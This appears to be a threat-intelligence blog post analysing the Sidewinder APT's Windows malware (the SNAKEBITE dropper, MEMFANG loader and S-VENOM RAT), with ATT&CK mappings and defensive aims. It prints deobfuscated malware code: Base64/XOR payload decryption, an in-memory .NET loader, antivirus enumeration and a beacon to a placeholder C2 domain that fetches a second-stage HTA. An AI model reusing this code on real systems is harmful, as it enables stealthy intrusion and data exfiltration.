---
layout: post
title:  "Exposing Sidewinder's Arsenal against Windows"
date:   2021-07-19 00:00:00 +0500
tags: sidewinder , rat
authors: ahmad-muneeb-khan , syed-hasan-akhtar
---

# {{ page.title }}
__Published:__ {{ page.date | date: "%a, %d %b, %y" }}  
__Authors:__ [Ahmad Muneeb Khan](/authors/ahmad-muneeb-khan.html), [Syed Hasan Akhtar](/authors/syed-hasan-akhtar.html)  
__Tags:__ [Sidewinder](/tags/sidewinder.html), [RAT](/tags/rat.html)  

## Background

While chasing the spear-phishing campaigns carried out in the South-Asian region by the well-known threat activity group “[Sidewinder](https://attack.mitre.org/groups/G0121/)” (a.k.a Rattlesnake, T-APT-04), Ebryx investigators witnessed the evolution of Sidewinder’s tactics and arsenal as it made attempts to evade detection and achieve its operational objectives. Sidewinder’s tools of choice for targeting Windows based machines primarily consist of two malware strains that Ebryx identifies as SNAKEBITE - a JavaScript-based dropper, MEMFANG - an in-memory implant, and S-VENOM - a RAT used by Sidewinder for accessing compromised Windows machines.

## SNAKEBITE

SNAKEBITE is a JavaScript based dropper that is not unique in nature, rather it is an amalgam of a custom decryption technique and open-source offensive tools. It has two distinct parts which include its own decryption scheme and a modified [Starfighters](https://github.com/Cn33liz/StarFighters) implementation of [Koadic](https://github.com/zerosum0x0/koadic) (an information gathering implant to perform post-exploitation reconnaissance on the victim machine) to load the payload in-memory.

Majority of the code in SNAKEBITE is obscured and encrypted via customized encryption. The decryption sequence consists of Base64 decode followed by XOR - the key for which is calculated at the time of execution. Primarily, an embedded phrase is decoded using Base64 and XORed with another embedded string. The resulting key is stored in the variable “keeee” and is used as the XOR decryption key for the rest of the payload. The aforementioned sequence is continued for every encrypted string which ultimately unravels the assembly payload embedded within the script.

{% highlight javascript %}
function qdeH(str) {
	var b64 = "qfU3vnNPFuaV8WcilGXYm0Rg2ASLM1HIkjKxJhwd7OZy6toz5Eep4rDbsTBQC9+/=";
	var b, result = "",
		r1, r2, i = 0;
	for (; i < str.length;) {
		b = b64.indexOf(str.charAt(i++)) << 18 | b64.indexOf(str.charAt(i++)) << 12 |
			(r1 = b64.indexOf(str.charAt(i++))) << 6 | (r2 = b64.indexOf(str.charAt(i++)));

		result += r1 === 64 ? QpmXHA(b >> 16 & 255) :
			r2 === 64 ? QpmXHA(b >> 16 & 255, b >> 8 & 255) :
			QpmXHA(b >> 16 & 255, b >> 8 & 255, b & 255);
	}
	return result;
};
function QeTPECI (key, bytes){
	var res = [];
	for (var i = 0; i < bytes.length; ) {
		for (var j = 0; j < key.length; j++) {
			res.push(QpmXHA((bytes.charCodeAt(i)) ^ key.charCodeAt(j)));
			i++;
			if (i >= bytes.length) {
				j = key.length;
			}
		}
	}
	return res.join("")
}
function PMKDTYDd(bsix){
	return QeTPECI(keeee,qdeH(bsix))
}
var keeee = QeTPECI("dDsB",qdeH("mdn"+"n1n"+"Wbl"+"Pu1"));
{% endhighlight %}
<p style="text-align: center;">The Base64 and XOR decryption sequence</p>


SNAKEBITE features a modified build of Starfighters (an in-memory launcher that has also been included in the Koadic framework as an implant) which seeks to deploy the MEMFANG implant directly into memory. The modified payload is a .NET assembly converted to javascript using [DotNetToJScript](https://github.com/tyranid/DotNetToJScript).

{% highlight javascript %}
var dash = "";
var enc = new ActiveXObject("System.Text.ASCIIEncoding");
var length = enc["GetByteCount_2"](b);
var ba = enc["GetBytes_4"](b);
var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
ba = transform["TransformFinalBlock"](ba, 0, length);
var ms = new ActiveXObject("System.IO.MemoryStream");
ms.Write(ba, 0, (length / 4) * 3);
ms.Position = 0;
dash = ms;

var so = <payload>

var stm = Func4(so.split(".").join(''));
var fmt = new ActiveXObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter");
var al = new ActiveXObject("System.Collections.ArrayList");
var d = fmt["Deserialize_2"](dash);
al.Add(undefined);
var o = d["DynamicInvoke"](al.ToArray())["CreateInstance"](ec);
{% endhighlight %}
<p style="text-align: center;">Deobfuscated Starfighters snippet from a variant of SNAKEBITE</p>

Starfighters implementation in SNAKEBITE requires setting the .NET version before execution which is achieved by checking for the subfolders in .NET installation directory using _FSO.GetFolder(FSO.GetSpecialFolder(0)+"\Microsoft.NET\Framework\").SubFolders;_. Once the .NET version is set, information regarding the installed Antivirus product is collected by querying the WMI service and later sent to the C2 server.  
  
_var objWMIService = GetObject("winmgmts:\\.\root\SecurityCenter2");_  
_var colItems = objWMIService.ExecQuery("Select * From AntiVirusProduct", null, 48);_  

{% highlight javascript %}
var shells = new ActiveXObject("WScript.Shell");
function MfNZUM(){
    var net = "";
    var FSO = new ActiveXObject("Scripting.FileSystemObject");
    var folds = FSO.GetFolder(FSO.GetSpecialFolder(0)+"\Microsoft.NET\Framework\").SubFolders;
    e = new Enumerator(folds);
    var folder;
    e.moveFirst();   
    while (e.atEnd() == false)  
    {  
        folder = e.item();
        var files = folder.files;
        var fileEnum = new Enumerator(files);
         fileEnum.moveFirst(); 
        while(fileEnum.atEnd() == false){
            if(fileEnum.item().Name == "csc.exe")
            {
                if(folder.Name.substring(0,2)=="v2")
                    return "v2.0.50727";
                else if(folder.Name.substring(0,2)=="v4")
                    return "v4.0.30319";
            }
             fileEnum[moveNext](); 
        }
        e[moveNext]();
    }
    return folder.Name;
}
ver = v2.0.50727;
try {
    ver = MfNZUM();
} catch(e) { 
    ver = "v2.0.50727";
}
shells.Environment("Process")(COMPLUS_Version) = ver;;
var objWMIService = GetObject("winmgmts:\\.\root\SecurityCenter2");
var colItems = objWMIService.ExecQuery("Select * From AntiVirusProduct", null, 48);
var objItem = new Enumerator(colItems); 
var x = "";
for (; !objItem.atEnd(); objItem[moveNext]()) {
    x += (objItem.item().displayName + " " + objItem.item().productState).replace(" ", "");
}
if(x && x.length){
    x = x + "_stg1";
}
var aUrl = "<C2_domain>/plugins/16364/11542/true/true/"+x;
o.pink("<C2_domain>/cgi/8ee4d36866/16364/11542/58a3a04b/file.hta",aUrl,da,<decoy_document_name>)
} catch (e) {}
finally{window.close();}
}
catch (e) {}
finally{window.close();}
{% endhighlight %}

## MEMFANG

MEMFANG is a .NET implant that is embedded inside SNAKEBITE and deployed directly in-memory via Starfighters. Using a DynamicInvoke call, it sideloads the DLL file to decrypt and load the payload, inside a randomly named encrypted .tmp file.

The decryption mechanism utilizes the first 32 bytes of the data in the .tmp file to perform a byte-wise XOR. This results in the decrypted assembly stored in “array2” which is then loaded and executed in memory.

{% highlight javascript %}
static Program()
{
	byte[] array = File.ReadAllBytes(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "LwBFLmM.tmp".Trim()));
	byte[] array2 = new byte[array.Length - 32];
	Buffer.BlockCopy(array, 32, array2, 0, array2.Length);
	for (int i = 0; i < array2.Length; i++)
	{
		byte[] array3 = array2;
		int num = i;
		array3[num] ^= array[i % 32];
	}
	Program._assembly = Assembly.Load(array2);
}
{% endhighlight %}

## S-VENOM

The decrypted payload injected into memory by MEMFANG implant acts as a Remote Access Tool for the operators. The RAT, identified as S-VENOM by Ebryx, is modular in nature and has several functionalities to collect information from the compromised host. This collected information is relayed back to the command and control server by means of a custom-developed web client.

Following information is collected by the S-VENOM post-intrusion:

### Enumerate Installed Software

S-VENOM traverses over the registry key, _‘Software\Microsoft\Windows\CurrentVersion\Uninstall’_, to find all installed applications on the system with a valid uninstallation path.

{% highlight javascript %}
using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall"))
{
    foreach (string name in registryKey.GetSubKeyNames())
    {
        using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
        {
	if (registryKey2 != null)
	{
		string text = registryKey2.GetValue("DisplayName") as string;
if (text != null)
{
    jsonWriter.WriteStartObject();
    jsonWriter.WritePropertyName("Name");
    jsonWriter.WriteValue(text);
    jsonWriter.WritePropertyName("Version”);
    jsonWriter.WriteValue(registryKey2.GetValue("DisplayVersion"));
    jsonWriter.WriteEndObject();
}
	}
       }
}
{% endhighlight %}

### Identify Security Solutions

Using the Windows Management Instrumentation (WMI) framework, S-VENOM attempts to enumerate all operating Antivirus and Antispyware products on the system.

{% highlight javascript %}
jsonWriter.WritePropertyName("antiVirusProduct");
SysInfo.WriteWmi(jsonWriter, "antiVirusProduct", "root\\SecurityCenter2", new string[]
{
	"displayName",
	"ProductState",
	"TimeStamp"
});
jsonWriter.WritePropertyName("antiSpywareProduct");
SysInfo.WriteWmi(jsonWriter, "antiSpywareProduct", "root\\SecurityCenter2", new string[]
{
	"displayName",
	"ProductState",
	"TimeStamp"
});
{% endhighlight %}

### Retrieve Access Tokens

Using the GetTokenInformation API call from advapi32.dll, the tool returns in-depth information about each access token on the system.

### Gather System Information

Apart from collecting information about Security Solutions, S-VENOM is also capable of collecting identifying information about the compromised host using WMI classes such as Win32_UserAccount, Win32_ComputerSystem, Win32_Process, Win32_OperatingSystem, Win32_TimeZone, and others.

### Enumerate Disks

S-VENOM enumerates all available disks along with collection of data such as free and used space, its label, and the formatting of the drive. Once collected, it begins enumerating folders and files inside each drive and their creation-access-modification times for exfiltration.

### Gather Network Information

S-VENOM collects network information from all available interfaces using the GetAllNetworkInterfaces call. Collected data includes MAC addresses, DNS servers, gateways, speeds, DHCP servers, and operational status of each interface.

## Tactics, Techniques and Procedures

### SNAKEBITE

|__Domain__  |__ID__     |__Name__                                   |__Usage__                                                                                                                                                                              |
|Enterprise  |T1047      |Windows Management Instrumentation         |Snakebite makes use of Windows Management Instrumentation (WMI) Service to collect information regarding the installed antivirus and its version on the victim machine                 |
|Enterprise  |T1059.007  |JavaScript                                 |Snakebite is completely JavaScript based and creates a window with (-1000,-1000) to hide itself from the visible screen                                                                |
|Enterprise  |T1574.002  |DLL Side-Loading                           |Snakebite performs DLL-Sideloading to inject the MEMFANG implant inside memory of an elevated process                                                                                  |
|Enterprise  |T1548.002  |Bypass User Access Control                 |Snakebite uses rekeywiz.exe or credwiz.exe to perform UAC bypass                                                                                                                       |
|Enterprise  |T1140      |Deobfuscate/Decode Files or Information    |Snakebite implements heavy obfuscation through a combination of Base64 and XOR to evade defense mechanisms and to slow down forensics. All JavaScript code is deobfuscated at runtime  |
|Enterprise  |T1218.005  |Mshta                                      |Snakebite makes use of Windows' own signed binary mshta.exe to run its JavaScript code as an .HTA file in order to bypass application whitelisting                                     |
|Enterprise  |T1083      |Files and Directory Discovery              |Snakebite checks for the Windows binary csc.exe in \Microsoft.NET\Framework\ to guess the installed .NET version and set the environment for the execution through WScript             |
|Enterprise  |T1518.001  |Security Software Discovery                |Snakebite checks for the installed antivirus and its version to craft a GET HTTP request in order to retrieve stage-2 payload                                                          |
|Enterprise  |T1132      |Data Encoding: Standard Encoding           |Snakebite encodes key information about the system and exfiltrates it through the embedded C&C URL                                                                                     |
|Enterprise  |T1071.001  |Application Layer Protocol: Web Protocols  |Snakebite uses the HTTP protocol to send GET requests to the C&C server. This request is intended to download the next payload and inform the C2 about target environment              |

### MEMFANG

|__Domain__  |__ID__ |__Name__                                 |__Usage__                                                                                           |
|Enterprise  |T1055  |Process Injection                        |MEMFANG injects the on-disk encrypted payload into the memory address space of the calling process  |
|Enterprise  |T1140  |Deobfuscate/Decode Files or Information  |MEMFANG deobfuscates the RAT and injects it directly into the memory                                |

### S-VENOM

|__Domain__  |__ID__ |__Name__                      |__Usage__                                                                                                                                          |
|Enterprise  |T1005  |Data from Local System        |S-VENOM collects data from the local system by enumerating drives and folders, while filtering them based on a set of extensions for exfiltration  |
|Enterprise  |T1119  |Automated Collection          |S-VENOM automates the collection process by enumerating WMI classes and pushing data to a file buffer for exfiltration                             |
|Enterprise  |T1041  |Exfiltration over C2 Channel  |S-VENOM exfiltrates data to the existing C2 channel after collection and updates its configuration periodically                                    |

## Outlook

The current arsenal of Sidewinder against the Windows based systems indicates their heavy utilization of open-source offensive tools and latest vulnerabilities or POCs shared by Google Project Zero. Koadic framework has also [reportedly been used](https://attack.mitre.org/software/S0250/) by other advanced threat activity groups like MuddyWater and APT28.

SideWinder’s continued usage of open-source tooling points to two potential scenarios; conservation of resources by using open-source tools despite public coverage and detection or an intentional effort to make attribution hard for defenders.

Coverage of the techniques implemented by such malware can significantly improve detection of similar intrusions and allow blue-teams to respond to threats that really matter contrary to chasing compliance checks or IOCs.